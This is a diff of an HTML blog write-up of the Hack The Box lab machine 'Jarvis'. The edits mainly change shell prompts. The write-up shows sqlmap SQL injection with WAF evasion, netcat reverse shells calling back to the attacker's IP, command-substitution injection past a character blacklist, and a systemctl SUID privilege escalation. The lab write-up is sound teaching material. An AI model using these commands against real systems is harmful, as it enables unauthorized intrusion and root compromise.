@@ -9,7 +9,7 @@
 <meta name="description" content="Jarvis was a pretty straight forward box and &amp;ldquo;textbook case&amp;rdquo; style. While it&amp;rsquo;s rated as Medium difficulty I would advise beginners to start with this one.
 It rely on bad configurations practices rather than already made exploits which makes it more interesting in my opinion.
 First thing first, let&amp;rsquo;s add the box IP to the hosts file:
-$ echo &amp;#34;10.10.10.143 jarvis.htb&amp;#34; &amp;gt;&amp;gt; /etc/hosts Let&amp;rsquo;s go !
+[hg8@archbook ~]$ echo &amp;#34;10.10.10.143 jarvis.htb&amp;#34; &amp;gt;&amp;gt; /etc/hosts Let&amp;rsquo;s go !
 User Flag Recon Let&amp;rsquo;s start with the classic nmap scan:"/>
 <meta name="keywords" content="hackthebox, ctf, jarvis, waf, gobuster, sql-injection, sqlmap, phpmyadmin, cve-2018-12613, python, systemctl, service, gtfobins, command-injection"/>
 <meta name="robots" content="noodp"/>
@@ -200,12 +200,12 @@ User Flag Recon Let&amp;rsquo;s start with the classic nmap scan:"/>
       <p>Jarvis was a pretty straight forward box and &ldquo;textbook case&rdquo; style. While it&rsquo;s rated as Medium difficulty I would advise beginners to start with this one.</p>
 <p>It rely on bad configurations practices rather than already made exploits which makes it more interesting in my opinion.</p>
 <p>First thing first, let&rsquo;s add the box IP to the hosts file:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;10.10.10.143 jarvis.htb&#34;</span> &gt;&gt; /etc/hosts
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;10.10.10.143 jarvis.htb&#34;</span> &gt;&gt; /etc/hosts
 </code></pre></div><p>Let&rsquo;s go !</p>
 <h1 id="user-flag">User Flag</h1>
 <h2 id="recon">Recon</h2>
 <p>Let&rsquo;s start with the classic <code>nmap</code> scan:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nmap -sV -sT -sC jarvis.htb
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nmap -sV -sT -sC jarvis.htb
 Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-10-16 19:16 CEST
 Nmap scan report <span style="color:#66d9ef">for</span> jarvis.htb <span style="color:#f92672">(</span>10.10.10.143<span style="color:#f92672">)</span>
 PORT   STATE SERVICE VERSION
@@ -220,7 +220,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 <p>Browsing the site shows available rooms, food and&hellip; that&rsquo;s it. The only page that looks dynamic is the room description page:
 Let&rsquo;s keep that in mind.</p>
 <p>Out of curiosity I ran <code>gobuster</code> to see if we can find interresting files and directories but nothing special was found :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gobuster dir -u http://jarvis.htb -w ~/SecLists/Discovery/Web-Content/common.txt
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ gobuster dir -u http://jarvis.htb -w ~/SecLists/Discovery/Web-Content/common.txt
 <span style="color:#f92672">===============================================================</span>
 Gobuster v3.0.1
 by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
@@ -270,7 +270,7 @@ by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:
 <p>Hey you have been banned for 90 seconds, don&rsquo;t be bad.</p>
 </blockquote>
 <p>Let&rsquo;s try different options. First adding a delay of 10 seconds between each request (with <code>--delay=10</code>) might not trigger the ban:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sqlmap -u <span style="color:#e6db74">&#34;http://jarvis.htb/room.php?cod=6&#34;</span> --delay<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span> --os-shell
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ sqlmap -u <span style="color:#e6db74">&#34;http://jarvis.htb/room.php?cod=6&#34;</span> --delay<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span> --os-shell
         ___
        __H__
  ___ ___<span style="color:#f92672">[)]</span>_____ ___ ___  <span style="color:#f92672">{</span>1.3.10#stable<span style="color:#f92672">}</span>
@@ -319,13 +319,12 @@ by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:
 <p><em>Note: We could also have used <code>--user-agent=&lt;random-ua&gt;</code> to avoid using the default <code>sqlmap</code> user agent that can get easily detected by WAF.</em></p>
 <p>We have a PHP shell running as www-data.
 For ease of use, I open a netcat reverse shell and close the php shell opened by SQLMap:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
 Listening on any address <span style="color:#ae81ff">8585</span>
-$
-$ <span style="color:#75715e"># Back to the SQLMap/PHP reverse shell</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ <span style="color:#75715e"># Back to the SQLMap/PHP reverse shell</span>
 os-shell&gt; nc -e /bin/sh 10.10.10.10 <span style="color:#ae81ff">8585</span>
 </code></pre></div><p>And surely we get the connection:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
 Listening on any address <span style="color:#ae81ff">8585</span>
 Connection from 10.10.10.143:54336
 id
@@ -335,9 +334,9 @@ uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www
 $ python -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
 Ctrl-Z
 
-$ <span style="color:#75715e"># In Attacker console</span>
-$ stty raw -echo
-$ fg
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ <span style="color:#75715e"># In Attacker console</span>
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ stty raw -echo
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ fg
 
 $ <span style="color:#75715e"># In reverse shell</span>
 $ reset
@@ -355,12 +354,10 @@ $connection<span style="color:#f92672">=</span>new mysqli<span style="color:#f92
 <p><img src="https://user-images.githubusercontent.com/9076747/67007518-e0bb6580-f0e7-11e9-9b1b-f01b364b2926.png" alt="Jarvis phpmyadmin instance"></p>
 <p>But turn out there is nothing interesting there. Only a empty <code>flag</code> database, probably a joke by one of the users. Let&rsquo;s move on.</p>
 <p>To make the recon task easier, we are going to use the <a href="https://github.com/diego-treitos/linux-smart-enumeration">Linux enumeration tool</a>. For the transfer of the script we will setup a simple http server on our attacking machine:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#75715e"># In attacker console</span>
-$ wget <span style="color:#e6db74">&#34;https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh&#34;</span> -O lse.sh
-$ python -m http.server
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ wget <span style="color:#e6db74">&#34;https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh&#34;</span> -O lse.sh
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python -m http.server
 Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
 
-$ <span style="color:#75715e"># In reverse shell</span>
 $ wget 10.10.10.10:8000/lse.sh -O /tmp/lse.sh
 2019-10-17 08:00:49 <span style="color:#f92672">(</span><span style="color:#ae81ff">527</span> KB/s<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;/tmp/lse.sh&#39;</span> saved <span style="color:#f92672">[</span>31736/31736<span style="color:#f92672">]</span>
 </code></pre></div><p>Let&rsquo;s run the script to see if we can find anything intesrresting :</p>
@@ -407,7 +404,7 @@ total <span style="color:#ae81ff">8</span>
 </code></pre></div><p><code>os.system('ping ' + command)</code> clearly open a command injection vulnerability. However the script author seems to be aware of the issue and blacklisted a few common characters used in command injection.</p>
 <p>So we can&rsquo;t easily inject command. But then what about command substitution ?</p>
 <p>According to the bash manual:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ man bash
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ man bash
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 Command Substitution
        Command substitution allows the output of a command to replace the command name.  There are two forms:
@@ -431,11 +428,9 @@ ___<span style="color:#f92672">(</span>_<span style="color:#f92672">)</span>_ __
 Enter an IP: <span style="color:#66d9ef">$(</span>id<span style="color:#66d9ef">)</span>
 ping: groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>pepper<span style="color:#f92672">)</span>: Temporary failure in name resolution
 </code></pre></div><p>Awseome, let&rsquo;s use this to open a reverse shell:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#75715e"># On attacker console</span>
-$ nc -l -vv -p <span style="color:#ae81ff">8544</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nc -l -vv -p <span style="color:#ae81ff">8544</span>
 Listening on any address <span style="color:#ae81ff">8544</span>
 
-$ <span style="color:#75715e"># On reverse shell</span>
 $ echo <span style="color:#e6db74">&#34;nc -e /bin/sh 10.10.10.10 8544&#34;</span> &gt; /tmp/hg8.sh
 $ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
 ***********************************************
@@ -451,7 +446,7 @@ ___<span style="color:#f92672">(</span>_<span style="color:#f92672">)</span>_ __
 
 Enter an IP: <span style="color:#66d9ef">$(</span>bash /tmp/hg8.sh<span style="color:#66d9ef">)</span>
 </code></pre></div><p>And surely enough we get our shell!</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -l -vv -p <span style="color:#ae81ff">8544</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nc -l -vv -p <span style="color:#ae81ff">8544</span>
 Listening on any address <span style="color:#ae81ff">8544</span>
 Connection from 10.10.10.143:57986
 pepper@jarvis:~$ id
@@ -477,19 +472,19 @@ pepper@jarvis:~$ cat user.txt
 <p>It runs with the SUID bit set and may be exploited to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (&lt;= Stretch) that allow the default sh shell to run with SUID privileges.</p>
 </blockquote>
 <p>First we open our listener:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
 Listening on any address <span style="color:#ae81ff">8585</span>
 </code></pre></div><p>Now let&rsquo;s run the GTFO example and replace the command with our reverse shell :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp<span style="color:#66d9ef">)</span>.service
-$ echo <span style="color:#e6db74">&#39;[Service]
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp<span style="color:#66d9ef">)</span>.service
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#39;[Service]
 </span><span style="color:#e6db74">Type=oneshot
 </span><span style="color:#e6db74">ExecStart=/bin/sh -c &#34;nc 10.10.10.10 8585 -e /bin/bash&#34;
 </span><span style="color:#e6db74">[Install]
 </span><span style="color:#e6db74">WantedBy=multi-user.target&#39;</span> &gt; $TF
-$ systemctl link $TF
-$ systemctl enable --now $TF
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ systemctl link $TF
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ systemctl enable --now $TF
 </code></pre></div><p>And since everything went fine, we get our shell:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
 Listening on any address <span style="color:#ae81ff">8585</span>
 Connection from 10.10.10.143:35734
 
